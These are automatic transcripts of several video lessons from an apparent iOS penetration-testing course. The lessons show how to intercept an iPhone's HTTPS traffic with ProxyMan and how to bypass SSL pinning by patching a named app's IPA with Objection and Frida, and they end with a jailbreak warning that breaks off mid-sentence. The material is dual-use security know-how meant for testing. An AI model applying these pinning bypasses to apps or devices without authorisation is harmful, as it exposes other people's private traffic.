00:00:13.750 --> 00:00:17.050
So the website for ProxyMan again is proxyman

8
00:00:17.050 --> 00:00:19.570
.io. You can download the proxy tool from

9
00:00:19.570 --> 00:00:19.870
there.

10
00:00:20.270 --> 00:00:22.910
They also have great documentation on this tool.

11
00:00:23.290 --> 00:00:25.590
In this video, I'm also going to show

12
00:00:25.590 --> 00:00:27.750
you how to instal the iOS app.

13
00:00:27.750 --> 00:00:30.610
So let's actually pull up our physical iOS

14
00:00:30.610 --> 00:00:31.509
device here.

15
00:00:32.110 --> 00:00:33.830
Okay, you can see that I have the

16
00:00:33.830 --> 00:00:36.310
Apple Store open on my iPhone.

17
00:00:37.090 --> 00:00:39.050
And all we need to do is go

18
00:00:39.050 --> 00:00:41.190
to search and look for ProxyMan.

19
00:00:42.830 --> 00:00:45.130
Okay, and here is the ProxyMan app.

20
00:00:45.170 --> 00:00:46.690
I'm just going to click get on that

21
00:00:46.690 --> 00:00:50.230
to download this application and instal the app.

22
00:00:57.580 --> 00:00:59.080
Okay, it looks like it's downloading.

23
00:00:59.660 --> 00:01:01.940
While this is happening, we can also go

24
00:01:01.940 --> 00:01:04.120
over to ProxyMan here on our MacBook.

25
00:01:04.600 --> 00:01:07.260
And get ready to instal everything we're going

26
00:01:07.260 --> 00:01:07.560
to need.

27
00:01:07.740 --> 00:01:09.840
So you can see instal certificate on iOS

28
00:01:09.840 --> 00:01:10.300
here.

29
00:01:10.620 --> 00:01:12.800
You can use this for simulators as well

30
00:01:12.800 --> 00:01:14.000
for the physical device.

31
00:01:14.400 --> 00:01:16.340
In this case, I am using the physical

32
00:01:16.340 --> 00:01:16.920
device.

33
00:01:17.300 --> 00:01:18.840
So I'm just going to click physical devices

34
00:01:18.840 --> 00:01:19.200
here.

35
00:01:19.300 --> 00:01:21.260
It's going to walk us through everything you

36
00:01:21.260 --> 00:01:21.860
need to do.

37
00:01:22.220 --> 00:01:24.540
So it says to open the iOS settings

38
00:01:24.540 --> 00:01:25.800
app, go to Wi-Fi.

39
00:01:25.940 --> 00:01:26.940
So I'm going to do that.

40
00:01:29.230 --> 00:01:31.590
Go down to configure proxy.

41
00:01:31.830 --> 00:01:32.970
And then you're going to set up the

42
00:01:32.970 --> 00:01:35.850
proxy for ProxyMan, which again is going to

43
00:01:35.850 --> 00:01:37.510
be on port 9090.

44
00:01:37.690 --> 00:01:41.330
So I'm going to do 192.168.127

45
00:01:41.330 --> 00:01:43.870
.197. And that's going to be on port

46
00:01:43.870 --> 00:01:44.750
9090.

47
00:01:45.230 --> 00:01:46.650
And click save.

48
00:01:49.850 --> 00:01:53.010
Okay, that says to open Safari on any

49
00:01:53.010 --> 00:01:54.630
iOS devices.

50
00:01:54.890 --> 00:01:56.690
So I'm going to go to ProxyMan.

51
00:01:59.240 --> 00:02:00.760
And now you can actually see this stuff

52
00:02:00.760 --> 00:02:02.200
is populating over here.

53
00:02:02.980 --> 00:02:05.020
All this stuff is from my iPhone under

54
00:02:05.020 --> 00:02:11.500
this 192.168.127.227. Bring our instructions

55
00:02:11.500 --> 00:02:12.440
back up here.

56
00:02:13.300 --> 00:02:14.280
So open Safari.

57
00:02:14.680 --> 00:02:17.600
And similarly to before, we're going to do

58
00:02:19.360 --> 00:02:31.170
http://proxy.man.ssl, click

59
00:02:31.170 --> 00:02:31.510
go.

60
00:02:31.790 --> 00:02:33.650
And now it's going to download the configuration

61
00:02:33.650 --> 00:02:34.430
profile.

62
00:02:34.430 --> 00:02:35.490
We're going to click allow.

63
00:02:35.650 --> 00:02:37.030
Now we have to go back to the

64
00:02:37.030 --> 00:02:38.790
settings and instal this profile.

65
00:02:39.430 --> 00:02:41.010
So I'm going to go down to general,

66
00:02:41.690 --> 00:02:45.970
go down to profiles, click ProxyMan, click instal,

67
00:02:46.250 --> 00:02:51.180
enter my passcode, click instal.

68
00:02:52.720 --> 00:02:55.080
And now we should be trusting the ProxyMan

69
00:02:55.080 --> 00:02:55.520
CA.

70
00:02:56.720 --> 00:02:59.020
And the last thing we need to do

71
00:02:59.020 --> 00:03:01.260
here as it shows is go to general,

72
00:03:01.360 --> 00:03:04.460
about certificate trust settings and switch the ProxyMan

73
00:03:04.460 --> 00:03:05.420
certificate on.

74
00:03:06.270 --> 00:03:09.220
So we're going to go to general, about,

75
00:03:09.580 --> 00:03:11.620
go down to the bottom here, to certificate

76
00:03:11.620 --> 00:03:15.500
trust settings, and then trust the ProxyMan CA.

77
00:03:16.200 --> 00:03:19.180
So now our phone should be intercepting all

78
00:03:19.180 --> 00:03:21.200
of its traffic through ProxyMan.

79
00:03:22.460 --> 00:03:24.900
Okay, let's just validate this.

80
00:03:27.060 --> 00:03:30.120
We should be able to go to Safari

81
00:03:30.120 --> 00:03:30.860
now.

82
00:03:30.860 --> 00:03:36.400
And let's go to yahoo.com.

83
00:03:37.920 --> 00:03:40.060
Okay, and we should see this popping up

84
00:03:40.060 --> 00:03:42.220
down here in ProxyMan at the bottom of

85
00:03:42.220 --> 00:03:44.080
our list, says this is all alphabetical.

86
00:03:44.200 --> 00:03:47.660
Yep, you can see some yahoo.com URLs

87
00:03:47.660 --> 00:03:50.400
are popping up here, like search.yahoo.com.

88
00:03:50.840 --> 00:03:53.880
And let's actually try to enable this domain

89
00:03:53.880 --> 00:03:56.720
in the HTTPS request handling here.

90
00:03:57.120 --> 00:03:58.780
I'm just going to click go on yahoo

91
00:03:58.780 --> 00:03:59.580
.com again.

92
00:03:59.580 --> 00:04:00.860
And we should see this stuff.

93
00:04:01.000 --> 00:04:02.420
Yep, all populating here.

94
00:04:02.500 --> 00:04:04.400
So now we can actually see our requests

95
00:04:04.400 --> 00:04:06.500
and the responses that we're getting back.

96
00:04:06.600 --> 00:04:08.180
So now we can see all these tonnes

97
00:04:08.180 --> 00:04:11.660
of requests in Safari for yahoo.com.

98
00:04:11.760 --> 00:04:14.000
So we know that we're actually intercepting traffic

99
00:04:14.000 --> 00:04:15.560
off of this phone now.

100
00:04:15.640 --> 00:04:18.720
We're able to go ahead and say, for

101
00:04:18.720 --> 00:04:21.000
example, click control here.

102
00:04:21.120 --> 00:04:22.740
We could do like edit and repeat.

103
00:04:22.960 --> 00:04:25.180
And we'd be able to repeat this request

104
00:04:25.180 --> 00:04:27.800
and edit any of these URL parameters here.

105
00:04:27.800 --> 00:04:31.620
For example, if there's any headers or any

106
00:04:31.620 --> 00:04:33.680
additional things in here, like here, you can

107
00:04:33.680 --> 00:04:35.940
see these are all part of the URL.

108
00:04:36.200 --> 00:04:37.940
You could go ahead and try to edit

109
00:04:37.940 --> 00:04:40.240
these to pen test them, right?

110
00:04:40.860 --> 00:04:43.520
Okay, and now let's actually try with an

111
00:04:43.520 --> 00:04:45.680
application and see if we can intercept that

112
00:04:45.680 --> 00:04:46.140
traffic.

113
00:04:46.900 --> 00:04:48.660
Actually, we can just use the Apple Store

114
00:04:48.660 --> 00:04:49.220
for this.

115
00:04:50.520 --> 00:04:52.380
Let's try to search for something with the

116
00:04:52.380 --> 00:04:54.080
Apple Store and see if this works.

117
00:04:55.520 --> 00:04:57.840
So we are actually able to intercept some

118
00:04:57.840 --> 00:04:59.940
things coming from the Apple Store here without

119
00:04:59.940 --> 00:05:01.980
really bypassing SSL pinning.

120
00:05:03.600 --> 00:05:05.000
So that's good.

121
00:05:05.360 --> 00:05:07.220
But the problem is when you actually click

122
00:05:07.220 --> 00:05:08.400
in here, you're not going to be able

123
00:05:08.400 --> 00:05:10.200
to see the requests and responses.

124
00:05:10.620 --> 00:05:12.940
So to see those requests and responses, you

125
00:05:12.940 --> 00:05:15.040
actually need to decrypt that URL.

126
00:05:15.680 --> 00:05:17.340
And then we want to try to decrypt

127
00:05:17.340 --> 00:05:19.020
them with the HTTPS response.

128
00:05:20.100 --> 00:05:22.840
And once you enable the domain, though, if

129
00:05:22.840 --> 00:05:26.380
you actually see errors coming up in your

130
00:05:26.380 --> 00:05:28.260
application, this is when we would need to

131
00:05:28.260 --> 00:05:31.360
use like SSL kill chain to actually use

132
00:05:31.360 --> 00:05:35.020
proxy man and decrypt the SSL traffic.

133
00:05:35.300 --> 00:05:37.780
So in my case, this is a jailbroken

134
00:05:37.780 --> 00:05:38.240
phone.

135
00:05:38.520 --> 00:05:40.680
At this point, I would re-jailbreak my

136
00:05:40.680 --> 00:05:43.560
phone and I would go and use SSL

137
00:05:43.560 --> 00:05:45.660
kill chain and everything like that that you'll

138
00:05:45.660 --> 00:05:47.100
see in the next videos.

139
00:05:47.100 --> 00:05:49.440
So please refer to those videos on how

140
00:05:49.440 --> 00:05:51.020
to set up SSL kill chain.

141
00:05:51.440 --> 00:05:53.820
And this will enable you to break SSL

142
00:05:53.820 --> 00:05:55.720
pinning for any of these domains.

143
00:05:55.900 --> 00:05:58.580
Now, we know that the traffic is being

144
00:05:58.580 --> 00:06:01.600
intercepted successfully because we saw our requests in

145
00:06:01.600 --> 00:06:04.960
Safari, say going to yahoo.com, for example.

146
00:06:05.660 --> 00:06:08.500
But in certain cases with certain applications, they

147
00:06:08.500 --> 00:06:10.280
might be enabling SSL pinning.

148
00:06:10.640 --> 00:06:12.260
So that's when we're going to have to

149
00:06:12.260 --> 00:06:13.880
try to break that functionality.

150
00:06:13.880 --> 00:06:15.880
But this is how you would generally set

151
00:06:15.880 --> 00:06:18.860
up an iOS physical device to be used

152
00:06:18.860 --> 00:06:19.740
with proxy man.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.070 --> 00:00:04.850
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, for dynamic analysis of iOS applications, one

2
00:00:04.850 --> 00:00:07.350
thing that we can do is breaking SSL

3
00:00:07.350 --> 00:00:08.530
pinning for iOS.

4
00:00:09.110 --> 00:00:10.530
And here it's going to get a little

5
00:00:10.530 --> 00:00:12.970
bit more complicated than it was for Android.

6
00:00:13.390 --> 00:00:16.010
In Android, we utilize objection to patch the

7
00:00:16.010 --> 00:00:18.570
APK and then we disabled SSL pinning.

8
00:00:18.830 --> 00:00:20.970
We can also do the exact same thing

9
00:00:20.970 --> 00:00:24.390
utilizing objection to patch an IPA as well.

10
00:00:24.770 --> 00:00:26.650
Now, it might not work in every single

11
00:00:26.650 --> 00:00:28.370
case, but it is something that you're going

12
00:00:28.370 --> 00:00:30.690
to want to try as a penetration tester.

13
00:00:31.330 --> 00:00:33.250
Now, when we use objection, this time it's

14
00:00:33.250 --> 00:00:36.270
actually going to require a physical device so

15
00:00:36.270 --> 00:00:38.490
that we can receive a provisioning profile.

16
00:00:38.990 --> 00:00:40.730
So we're going to get our provisioning profile

17
00:00:40.730 --> 00:00:43.010
and that's going to allow us to actually

18
00:00:43.010 --> 00:00:45.690
take the application, make changes to it, and

19
00:00:45.690 --> 00:00:48.130
then republish it back onto our iPhone.

20
00:00:48.750 --> 00:00:51.230
For iOS, our last resort is going to

21
00:00:51.230 --> 00:00:54.290
be utilizing a jailbroken iOS device and then

22
00:00:54.290 --> 00:00:56.690
using a tool like SSL Kill Chain that

23
00:00:56.690 --> 00:00:58.310
I'll show you in the videos to break

24
00:00:58.310 --> 00:00:59.310
SSL pinning.

25
00:00:59.630 --> 00:01:01.210
This is actually doing this kind of from

26
00:01:01.210 --> 00:01:03.010
like the hardware level.

27
00:01:03.290 --> 00:01:06.770
Okay, so we're adding this application called SSL

28
00:01:06.770 --> 00:01:09.570
Kill Chain that's going to kill SSL for

29
00:01:09.570 --> 00:01:10.890
all of our applications.

30
00:01:11.190 --> 00:01:13.330
And again, we'll be intercepting that through Burp

31
00:01:13.330 --> 00:01:13.530
Suite.

32
00:01:14.170 --> 00:01:15.890
We're not going to touch too much on

33
00:01:15.890 --> 00:01:16.790
this on the videos.

34
00:01:16.950 --> 00:01:18.970
I will show in Xcode how you can

35
00:01:18.970 --> 00:01:21.050
look through this section.

36
00:01:21.050 --> 00:01:23.470
But another part of dynamic analysis that you'll

37
00:01:23.470 --> 00:01:25.670
want to do is looking through things like

38
00:01:25.670 --> 00:01:26.510
the log files.

39
00:01:26.810 --> 00:01:29.090
Say, for example, if we're using a simulator,

40
00:01:29.370 --> 00:01:31.170
looking through the log file to see if

41
00:01:31.170 --> 00:01:32.970
anything is logged in securely.

42
00:01:33.710 --> 00:01:35.370
And also, we can do the same thing

43
00:01:35.370 --> 00:01:37.870
with a physical device, look through the logs

44
00:01:37.870 --> 00:01:38.790
and everything like that.

45
00:01:39.350 --> 00:01:42.030
The most important part of dynamic analysis for

46
00:01:42.030 --> 00:01:45.590
iOS applications is really being able to actually

47
00:01:45.590 --> 00:01:48.370
intercept that network traffic and changing some of

48
00:01:48.370 --> 00:01:50.190
the parameters and things like that.

49
00:01:50.190 --> 00:01:53.790
So let's get started now into breaking SSL

50
00:01:53.790 --> 00:01:54.670
pinning for iOS.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.200 --> 00:00:03.000
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's talk now about how we can

2
00:00:03.000 --> 00:00:05.920
use Objection to patch an IPA file.

3
00:00:06.540 --> 00:00:08.100
On the right here you'll see that I'm

4
00:00:08.100 --> 00:00:09.080
using an iPhone.

5
00:00:09.240 --> 00:00:11.920
It is already previously jailbroken, but it's not

6
00:00:11.920 --> 00:00:14.220
necessarily what you need to do to set

7
00:00:14.220 --> 00:00:15.640
up Objection properly.

8
00:00:16.160 --> 00:00:17.660
So the first thing we need to do

9
00:00:17.660 --> 00:00:19.860
is instal Objection if you have not done

10
00:00:19.860 --> 00:00:20.160
this.

11
00:00:20.760 --> 00:00:23.040
First we're going to do a PIP3 and

12
00:00:24.260 --> 00:00:26.760
and then we're going to do instal and

13
00:00:26.760 --> 00:00:29.840
then Frida-tools and this will instal all

14
00:00:29.840 --> 00:00:35.710
the Frida tools for us and if you

15
00:00:35.710 --> 00:00:37.470
do not have PIP, obviously you're going to

16
00:00:37.470 --> 00:00:39.430
need to instal Python before this.

17
00:00:39.770 --> 00:00:42.550
I do already have Frida tools installed, so

18
00:00:42.550 --> 00:00:44.250
it will say that all the requirements are

19
00:00:44.250 --> 00:00:45.150
already satisfied.

20
00:00:45.970 --> 00:00:48.650
And now we're going to do PIP3 instal

21
00:00:48.650 --> 00:00:54.800
Objection and again, I already have Objection installed

22
00:00:54.800 --> 00:00:57.880
and unfortunately for this video, I will not

23
00:00:57.880 --> 00:01:00.740
be able to show you Objection completely patching

24
00:01:00.740 --> 00:01:01.600
the IPA.

25
00:01:01.800 --> 00:01:05.120
I'm having some errors with my Objection installation.

26
00:01:05.400 --> 00:01:07.780
I think it's because I have some old

27
00:01:07.780 --> 00:01:10.900
versions of the libraries that are utilised by

28
00:01:10.900 --> 00:01:13.440
Objection, so it's having a difficult time creating

29
00:01:13.440 --> 00:01:14.920
the new IPA file.

30
00:01:15.400 --> 00:01:17.660
Unfortunately, I was not able to iron out

31
00:01:17.660 --> 00:01:19.440
all those kinks, but I can still show

32
00:01:19.440 --> 00:01:21.800
you the exact commands to use to utilise

33
00:01:21.800 --> 00:01:22.500
Objection.

34
00:01:22.500 --> 00:01:25.020
So now that we have Objection and Frida

35
00:01:25.020 --> 00:01:27.440
installed, we can just test Objection by doing

36
00:01:27.440 --> 00:01:31.160
Objection into the terminal and again, the syntax

37
00:01:31.160 --> 00:01:33.580
for this is going to be very similar

38
00:01:33.580 --> 00:01:36.040
to that of which we used for Android.

39
00:01:36.580 --> 00:01:38.800
So for example, if I was going to

40
00:01:38.800 --> 00:01:41.780
be patching an IPA that I already had

41
00:01:41.780 --> 00:01:43.960
downloaded, I'm going to do a quick CD

42
00:01:43.960 --> 00:01:45.960
here to my documents and go to my

43
00:01:45.960 --> 00:01:49.040
AnyTrans library here and then the apps folder

44
00:01:49.040 --> 00:01:51.340
and this is where the IPA is actually

45
00:01:51.340 --> 00:01:51.720
stored.

46
00:01:51.720 --> 00:01:54.780
You can see the sunbeltrentals.ipa that we

47
00:01:54.780 --> 00:01:56.680
were already interacting with before.

48
00:01:57.360 --> 00:01:59.220
Now if we wanted to use this with

49
00:01:59.220 --> 00:02:02.480
Objection, we're going to do the command Objection

50
00:02:02.480 --> 00:02:05.220
patch IPA this time.

51
00:02:06.680 --> 00:02:08.639
Patch IPA just like this.

52
00:02:08.940 --> 00:02:12.080
So again, Objection, if we're doing an APK,

53
00:02:12.200 --> 00:02:14.260
we would do Objection patch APK.

54
00:02:14.420 --> 00:02:16.800
In this case, we are patching an IPA.

55
00:02:16.800 --> 00:02:20.340
Then we would do TACTAC source and then

56
00:02:20.340 --> 00:02:22.540
we would do the name of our IPA.

57
00:02:22.640 --> 00:02:24.600
So in this case, it would be sunbeltrentals

58
00:02:24.600 --> 00:02:28.020
.ipa. Now by doing this, we're actually still

59
00:02:28.020 --> 00:02:30.780
missing one component of this command and this

60
00:02:30.780 --> 00:02:33.460
is going to be ATTACKC and this is

61
00:02:33.460 --> 00:02:36.460
going to be your code sign signature that

62
00:02:36.460 --> 00:02:38.520
you're going to actually get out of Xcode

63
00:02:38.520 --> 00:02:40.840
with your developer profile.

64
00:02:41.440 --> 00:02:43.960
Now in my case, I already have a

65
00:02:43.960 --> 00:02:47.220
developer profile, provisioning profile already up and ready.

66
00:02:47.580 --> 00:02:49.120
But let me take a moment and actually

67
00:02:49.120 --> 00:02:50.980
show you how you would get one from

68
00:02:50.980 --> 00:02:53.380
scratch if you were doing this for the

69
00:02:53.380 --> 00:02:54.400
very first time.

70
00:02:55.000 --> 00:02:59.140
So I'm going to open Xcode now and

71
00:02:59.140 --> 00:03:00.480
I'm just going to go to Xcode here.

72
00:03:00.560 --> 00:03:02.260
I already have this application built.

73
00:03:02.680 --> 00:03:04.380
I did this by create a new Xcode

74
00:03:04.380 --> 00:03:07.180
project and just did a generic like hello

75
00:03:07.180 --> 00:03:08.500
world application.

76
00:03:08.820 --> 00:03:10.640
In this case, the name of the application

77
00:03:10.640 --> 00:03:12.320
is hello world 69.

78
00:03:13.060 --> 00:03:14.160
Here we go.

79
00:03:14.360 --> 00:03:16.460
Okay, so it's loading up the hello world

80
00:03:16.460 --> 00:03:17.180
application.

81
00:03:17.800 --> 00:03:19.800
And at this point you need to actually

82
00:03:19.800 --> 00:03:25.480
plug your iPhone into your Mac device and

83
00:03:25.480 --> 00:03:27.800
then we are going to actually instal the

84
00:03:27.800 --> 00:03:28.400
application.

85
00:03:28.860 --> 00:03:30.640
So you can see here on the iPhone,

86
00:03:31.120 --> 00:03:33.260
I already have this application installed.

87
00:03:33.420 --> 00:03:36.320
I'm going to just delete this for right

88
00:03:36.320 --> 00:03:36.700
now.

89
00:03:37.660 --> 00:03:39.820
Okay, and all you need to do is

90
00:03:39.820 --> 00:03:42.060
go up here to the top left corner

91
00:03:42.060 --> 00:03:45.040
and select where you're going to be installing

92
00:03:45.040 --> 00:03:45.640
this to.

93
00:03:45.880 --> 00:03:48.600
Now we could instal our application to any

94
00:03:48.600 --> 00:03:51.440
of the simulators like that, but to get

95
00:03:51.440 --> 00:03:54.580
an actual provisioning profile, this is not going

96
00:03:54.580 --> 00:03:55.100
to work.

97
00:03:55.460 --> 00:03:56.840
And this is the reason that we need

98
00:03:56.840 --> 00:03:58.300
an actual physical device.

99
00:03:58.400 --> 00:04:00.540
You need to physically plug in your device

100
00:04:00.540 --> 00:04:02.820
to the MacBook and then you're going to

101
00:04:02.820 --> 00:04:05.180
select that device up here to instal your

102
00:04:05.180 --> 00:04:06.220
application on.

103
00:04:06.220 --> 00:04:09.000
Don't worry about these runtime errors on the

104
00:04:09.000 --> 00:04:09.180
left.

105
00:04:09.300 --> 00:04:10.100
I have a tonne of.

106
00:04:10.240 --> 00:04:12.300
This is only because I'm using an older

107
00:04:12.300 --> 00:04:12.940
iPhone.

108
00:04:13.360 --> 00:04:15.500
I'm getting a bunch of errors in terms

109
00:04:15.500 --> 00:04:18.500
of what type of iOS is supported for

110
00:04:18.500 --> 00:04:19.459
my device.

111
00:04:19.720 --> 00:04:22.580
If you do have issues with that, you

112
00:04:22.580 --> 00:04:28.000
can actually change what version of the iOS

113
00:04:28.000 --> 00:04:31.040
is being targeted here in your application.

114
00:04:31.340 --> 00:04:33.360
This is under the general tab here and

115
00:04:33.760 --> 00:04:36.300
you can change this target to like iOS

116
00:04:36.300 --> 00:04:39.260
13.6 all depending on what version of

117
00:04:39.260 --> 00:04:40.620
Xcode you have installed.

118
00:04:41.140 --> 00:04:42.740
Now notice this does not go all the

119
00:04:42.740 --> 00:04:44.800
way up to like 14.7 for me.

120
00:04:45.160 --> 00:04:47.180
This is because I'm using an older version

121
00:04:47.180 --> 00:04:50.100
of Xcode, but on newer versions of Xcode,

122
00:04:50.300 --> 00:04:53.060
this has support for tonnes of more types

123
00:04:53.060 --> 00:04:54.160
of iOS devices.

124
00:04:54.400 --> 00:04:56.220
In this case, my device I'm using in

125
00:04:56.220 --> 00:04:59.320
this example is 12.4. So now all

126
00:04:59.320 --> 00:05:00.960
you have to do is click the run

127
00:05:00.960 --> 00:05:03.660
here and this will actually start installing the

128
00:05:03.660 --> 00:05:05.460
application onto the phone.

129
00:05:05.660 --> 00:05:07.360
You should see it pop up here in

130
00:05:07.360 --> 00:05:09.380
just a second on the phone.

131
00:05:09.840 --> 00:05:11.680
You can see up here in Xcode it

132
00:05:11.680 --> 00:05:14.020
says installing to Aaron's iPhone.

133
00:05:18.120 --> 00:05:20.080
It says unlock the phone to continue.

134
00:05:21.040 --> 00:05:23.000
So I'm going to do that and now

135
00:05:23.000 --> 00:05:25.120
we can see that the Hello World application

136
00:05:25.120 --> 00:05:26.260
is installed.

137
00:05:26.260 --> 00:05:28.500
And now it's going to say the untrusted

138
00:05:28.500 --> 00:05:30.940
developer, your device management settings do not allow

139
00:05:30.940 --> 00:05:34.720
apps from developer, and that's my Apple development

140
00:05:34.720 --> 00:05:35.080
ID.

141
00:05:35.340 --> 00:05:37.320
So I can actually just go to cancel

142
00:05:37.320 --> 00:05:39.900
and if your development ID is not trusted,

143
00:05:40.060 --> 00:05:41.620
you're just going to go to settings here.

144
00:05:41.700 --> 00:05:43.760
You're going to go to general, go down

145
00:05:43.760 --> 00:05:46.680
to profiles and device management, and I'm going

146
00:05:46.680 --> 00:05:50.580
to accept my Apple development certification here.

147
00:05:50.640 --> 00:05:53.500
I'm going to click trust Apple development, trust,

148
00:05:54.080 --> 00:05:56.140
and this is going to actually allow the

149
00:05:56.140 --> 00:05:56.880
app to run.

150
00:05:57.240 --> 00:05:58.600
Now if I go over to the app,

151
00:05:58.740 --> 00:06:00.200
it will just open up and it should

152
00:06:00.200 --> 00:06:01.280
say Hello World.

153
00:06:01.780 --> 00:06:04.860
Might get some weird errors here, but as

154
00:06:04.860 --> 00:06:07.820
long as the application is installed, you should

155
00:06:07.820 --> 00:06:08.940
be good to go.

156
00:06:09.380 --> 00:06:10.900
So now we should be able to actually

157
00:06:10.900 --> 00:06:12.960
find our code side and signature.

158
00:06:13.540 --> 00:06:15.140
And how we're going to do this is

159
00:06:15.140 --> 00:06:16.840
we're going to run, go back to our

160
00:06:16.840 --> 00:06:19.180
terminal, and we're going to run the command

161
00:06:19.180 --> 00:06:26.320
security find-identity, and this is telling me

162
00:06:26.320 --> 00:06:29.380
all of the provisioning profiles I have available

163
00:06:29.380 --> 00:06:32.100
for my MacBook.

164
00:06:32.740 --> 00:06:35.180
Okay, so the one that we used here

165
00:06:35.180 --> 00:06:37.900
was this one, and the interesting thing about

166
00:06:37.900 --> 00:06:41.780
these development profiles is they actually expire after

167
00:06:41.780 --> 00:06:45.080
seven days when you're using a free developer

168
00:06:45.080 --> 00:06:45.600
licence.

169
00:06:45.800 --> 00:06:47.260
So by the time this goes out to

170
00:06:47.260 --> 00:06:49.700
the internet and everything for this course, these

171
00:06:49.700 --> 00:06:52.060
are going to actually be expired for me.

172
00:06:52.540 --> 00:06:54.520
So now I'm going to just copy this

173
00:06:54.520 --> 00:06:56.000
string out of here.

174
00:06:56.300 --> 00:06:58.880
You might only see like one or two

175
00:06:58.880 --> 00:07:02.280
of these out there, depending on how many

176
00:07:02.280 --> 00:07:04.560
development licences you actually have installed.

177
00:07:04.680 --> 00:07:05.840
If you're doing this for the first time,

178
00:07:05.880 --> 00:07:07.300
you're only going to have one.

179
00:07:07.820 --> 00:07:09.200
I'm just going to clear this out.

180
00:07:09.520 --> 00:07:11.500
And again, now we're going to try to

181
00:07:11.500 --> 00:07:13.080
patch our application.

182
00:07:13.620 --> 00:07:16.520
Again, in this case, the application of interest

183
00:07:16.520 --> 00:07:18.680
that we're trying to break SSL pinning on

184
00:07:18.680 --> 00:07:22.440
would be this sunbeltrentals.ipa. So now I'm

185
00:07:22.440 --> 00:07:25.820
going to do objection and then patch IPA.

186
00:07:26.600 --> 00:07:29.660
Okay, and then source dash dash source.

187
00:07:30.660 --> 00:07:34.740
The name of the target IPA, in this

188
00:07:34.740 --> 00:07:38.040
case sunbeltrentals.ipa. I do a dash C

189
00:07:38.040 --> 00:07:42.060
to show my code sign signature, and now

190
00:07:42.060 --> 00:07:43.800
I'm just going to paste that string I

191
00:07:43.800 --> 00:07:46.400
just got out of the security identities there

192
00:07:46.400 --> 00:07:48.380
for my provisioning profile.

193
00:07:48.680 --> 00:07:51.360
And here, it's going to start running objection.

194
00:07:51.640 --> 00:07:53.520
It's going to try to patch the IPA.

195
00:07:53.920 --> 00:07:55.820
In my case, I am going to have

196
00:07:55.820 --> 00:08:00.840
an error because I have some weird dependency

197
00:08:00.840 --> 00:08:02.820
issues right now with objection that I was

198
00:08:02.820 --> 00:08:03.880
not able to resolve.

199
00:08:04.320 --> 00:08:05.880
You can see that it found a valid

200
00:08:05.880 --> 00:08:06.820
provisioning profile.

201
00:08:07.140 --> 00:08:09.060
So now it's going to actually be trying

202
00:08:09.060 --> 00:08:14.160
to change the application source code to allow

203
00:08:14.160 --> 00:08:15.800
objection and Frida to work.

204
00:08:15.980 --> 00:08:17.700
Again, I'm going to get an error here.

205
00:08:17.700 --> 00:08:21.320
But if everything works successfully for you, then

206
00:08:21.320 --> 00:08:25.420
you should now have a new IPA that's

207
00:08:25.420 --> 00:08:27.880
going to be like, in our case, sunbeltrentals

208
00:08:27.880 --> 00:08:33.080
.objection.ipa and it will rebuild the whole

209
00:08:33.080 --> 00:08:34.620
entire application for you.

210
00:08:35.039 --> 00:08:37.919
Then you can actually take that application, put

211
00:08:37.919 --> 00:08:40.900
it onto your iPhone, run the command objection

212
00:08:40.900 --> 00:08:45.180
explore, and actually explore all the application components.

213
00:08:45.320 --> 00:08:46.980
And you'll be able to break SSL pinning,

214
00:08:47.160 --> 00:08:49.640
just like what I demonstrated with the Android

215
00:08:49.640 --> 00:08:51.560
pen testing video as well.

216
00:08:52.520 --> 00:08:54.100
So here, I'm going to run into some

217
00:08:54.100 --> 00:08:54.920
errors, I believe.

218
00:08:55.200 --> 00:08:56.740
Yep, it's not going to be able to

219
00:08:56.740 --> 00:09:00.900
build this, but if you installed objection successfully,

220
00:09:01.020 --> 00:09:02.980
and you're not having the same dependency issues

221
00:09:02.980 --> 00:09:05.560
I'm having, everything should be good for you,

222
00:09:05.580 --> 00:09:08.580
and you should have a new application called

223
00:09:08.580 --> 00:09:13.080
like sunbeltrentals.objection.ipa and then you can

224
00:09:13.080 --> 00:09:15.320
go ahead and instal that onto your phone.

225
00:09:15.700 --> 00:09:17.580
And then you can use the command objection

226
00:09:17.580 --> 00:09:20.640
explore, just like this, and that will hook

227
00:09:20.640 --> 00:09:21.680
into the application.

228
00:09:22.040 --> 00:09:23.880
And then you'll be able to do things

229
00:09:23.880 --> 00:09:26.560
like breaking SSL pinning using the same commands

230
00:09:26.560 --> 00:09:30.040
I demonstrated in the Android objection section.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.200 --> 00:00:04.340
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now let's talk about jailbreaking a device.

2
00:00:04.740 --> 00:00:06.740
Now before we get started with this, I

3
00:00:06.740 --> 00:00:10.480
want to throw out there that jailbreaking can

4
00:00:10.480 --> 00:00:11.200
be dangerous.

5
00:00:11.420 --> 00:00:13.740
There have been instances where people have gotten

6
00:00:13.740 --> 00:00:17.360
ransomware, they have gotten their accounts stolen, everything

7
00:00:17.360 --> 00:00:19.640
like that by using a jailbreak.

8
00:00:19.940 --> 00:00:21.120
The thing that we're going to be doing

9
00:00:21.120 --> 00:00:23.820
with jailbreaking is we're going to be decrypting

10
00:00:23.820 --> 00:00:27.220
SSL traffic, so anything that you're sending through

11
00:00:27.220 --> 00:00:30.720
the jailbroken device, if somehow they're sending that

12
00:00:30.720 --> 00:00:33.200
data somewhere, you might be leaking some of

13
00:00:33.200 --> 00:00:36.860
your credentials, your Apple ID, anything like that,

14
00:00:36.960 --> 00:00:38.920
so you have to be really careful when

15
00:00:38.920 --> 00:00:40.480
you're using a jailbreak.

16
00:00:40.620 --> 00:00:42.920
I would not use anything that is not

17
00:00:42.920 --> 00:00:46.240
like a burner account for any of the

18
00:00:46.240 --> 00:00:50.320
applications you'll be using or using like a

19
00:00:50.320 --> 00:00:53.660
burner Apple ID as well, just in case

20
00:00:53.660 --> 00:00:55.400
anything bad happens.

21
00:00:55.400 --> 00:00:58.440
I do not trust jailbreaks in terms of

22
00:00:58.440 --> 00:01:01.860
their security, because honestly you're breaking the security

23
00:01:01.860 --> 00:01:04.300
when you're using a jailbreak, right?

24
00:01:04.580 --> 00:01:07.040
So we want to be very careful with

25
00:01:07.040 --> 00:01:09.720
what we're doing when we're using a jailbreak.

26
00:01:10.720 --> 00:01:15.160
Now with that said, if you do have

27
00:01:15.160 --> 00:01:17.620
an account stolen or something like that, I

28
